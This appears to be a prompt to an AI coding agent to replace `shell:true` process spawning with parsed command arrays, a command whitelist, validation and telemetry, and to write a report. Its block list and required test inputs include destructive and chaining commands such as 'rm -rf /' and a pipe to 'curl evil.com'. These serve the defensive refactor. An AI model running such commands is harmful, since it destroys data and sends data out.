You are a Principal Runtime Security Refactor Engineer.

MISSION:
Safely eliminate ALL `shell:true` usage from the runtime process system and replace it with a production-grade secure spawn architecture using explicit command arrays and strict command validation.

ROOT TARGET:
server/infrastructure/process/
server/infrastructure/runtime/
server/tools/
server/security/
server/orchestration/

━━━━━━━━━━━━━━━━━━━━
PRIMARY GOAL
━━━━━━━━━━━━━━━━━━━━

Current architecture uses:

```ts
spawn(command, {
  shell: true
})

This is a CRITICAL security weakness.

It allows:

shell injection

command chaining

unsafe execution

sandbox escape risks


Your mission is to:

✅ remove shell:true ✅ implement secure command parsing ✅ implement command whitelist validation ✅ preserve runtime compatibility ✅ preserve npm/vite/dev workflows ✅ preserve preview lifecycle ✅ preserve SSE runtime sync ✅ preserve orchestration flow

WITHOUT breaking runtime behavior.

━━━━━━━━━━━━━━━━━━━━ MANDATORY ENGINEERING RULES ━━━━━━━━━━━━━━━━━━━━

1. HIGH COHESION



each module = one responsibility

no mixed runtime/security logic


2. LOW COUPLING



runtime manager must not directly own parsing/security logic

use isolated services


3. FILE SIZE LIMIT



every file under 250 lines

split modules if needed


4. ROOT CAUSE FIX



remove underlying security weakness

not superficial patching


5. PRODUCTION-GRADE CODE



readable naming

typed interfaces

scalable structure

secure defaults

no hacks


6. CODE REVIEW STANDARD



verify imports

verify runtime flow

verify no regression

verify no hidden side effects


7. FAIL-CLOSED EXECUTION



invalid commands MUST fail

blocked commands MUST emit telemetry

runtime must NEVER fallback to unsafe shell execution


8. TELEMETRY REQUIRED Log:



command accepted

command rejected

validation failure

runtime spawn start

runtime spawn failure

security policy blocks


━━━━━━━━━━━━━━━━━━━━ DEEP SCAN REQUIRED ━━━━━━━━━━━━━━━━━━━━

Deeply inspect:

process-registry.ts

runtime-manager.ts

server-lifecycle-tools.ts

tool-call.executor.ts

policy engine

sandbox systems

command execution flows

spawn wrappers

npm/vite startup flow

preview startup flow


Trace COMPLETE flow:

Agent → tool executor → runtime manager → process registry → spawn() → stdout/stderr → preview lifecycle → SSE → frontend

━━━━━━━━━━━━━━━━━━━━ REQUIRED SECURITY ARCHITECTURE ━━━━━━━━━━━━━━━━━━━━

Implement:

server/security/runtime-command-policy/ ├── command-parser.ts ├── command-validator.ts ├── command-whitelist.ts ├── command-types.ts └── telemetry-hooks.ts

━━━━━━━━━━━━━━━━━━━━ REQUIRED DESIGN ━━━━━━━━━━━━━━━━━━━━

1. COMMAND PARSER

Convert:

npm run dev

INTO:

{
  command: "npm",
  args: ["run", "dev"]
}

STRICT parsing only.

NO:

&&

||

;

> 

<

pipes

subshells

eval

bash injection


━━━━━━━━━━━━━━━━━━━━

2. COMMAND WHITELIST

ONLY allow:

✅ npm ✅ node ✅ vite ✅ pnpm ✅ yarn

Optional: ✅ bun

BLOCK: ❌ rm ❌ sudo ❌ curl ❌ wget ❌ bash ❌ sh ❌ powershell ❌ cmd.exe

━━━━━━━━━━━━━━━━━━━━

3. VALIDATION LAYER

Before ANY spawn:

Validate:

command

args

characters

length

dangerous patterns

injection patterns


Fail closed on ANY violation.

━━━━━━━━━━━━━━━━━━━━

4. SAFE SPAWN

REPLACE:

spawn(command, {
  shell: true
})

WITH:

spawn(command, args, {
  shell: false
})

━━━━━━━━━━━━━━━━━━━━

5. TELEMETRY

Emit:

runtime.command.accepted
runtime.command.rejected
runtime.spawn.started
runtime.spawn.failed
runtime.security.blocked

━━━━━━━━━━━━━━━━━━━━

6. ERROR HANDLING

On blocked command:

emit telemetry

emit runtime security event

fail safely

preserve runtime stability

preserve preview lifecycle


━━━━━━━━━━━━━━━━━━━━ VERIFY COMPATIBILITY ━━━━━━━━━━━━━━━━━━━━

Verify ALL still work:

✅ npm run dev ✅ vite dev server ✅ preview proxy ✅ SSE updates ✅ stdout capture ✅ stderr capture ✅ runtime lifecycle ✅ startup verifier ✅ health checks ✅ restart flow ✅ recovery flow

━━━━━━━━━━━━━━━━━━━━ CHECK FOR BREAKAGE ━━━━━━━━━━━━━━━━━━━━

Verify:

no broken imports

no circular dependencies

no runtime regressions

no preview regressions

no startup failures

no orchestration breakage


━━━━━━━━━━━━━━━━━━━━ REQUIRED TESTS ━━━━━━━━━━━━━━━━━━━━

Test:

1. Valid command



npm run dev

2. Invalid command



rm -rf /

3. Injection attempt



npm run dev && rm -rf /

4. Pipe injection



npm run dev | curl evil.com

5. Long malformed input



Verify: ✅ blocked safely ✅ telemetry emitted ✅ runtime stable

━━━━━━━━━━━━━━━━━━━━ REQUIRED REPORT ━━━━━━━━━━━━━━━━━━━━

Generate:

SHELL_FALSE_SECURITY_REFACTOR_REPORT.md

━━━━━━━━━━━━━━━━━━━━ REPORT MUST INCLUDE ━━━━━━━━━━━━━━━━━━━━

1. Files Modified


2. Old shell:true locations


3. New secure spawn architecture


4. Command parser design


5. Validation flow


6. Whitelist rules


7. Telemetry flow


8. Security hardening summary


9. Injection prevention analysis


10. Runtime compatibility verification


11. Preview compatibility verification


12. SSE compatibility verification


13. Recovery compatibility verification


14. Startup compatibility verification


15. Blocked command test results


16. Allowed command test results


17. Circular dependency check


18. Runtime stability verification


19. Production readiness impact


20. Updated Replit similarity %


21. Security score improvement


22. Remaining runtime risks



━━━━━━━━━━━━━━━━━━━━ FINAL GOAL ━━━━━━━━━━━━━━━━━━━━

Transform runtime execution from:

⚠️ partially secure runtime

INTO:

🔥 production-grade fail-closed secure runtime execution system

WITHOUT breaking the autonomous runtime lifecycle.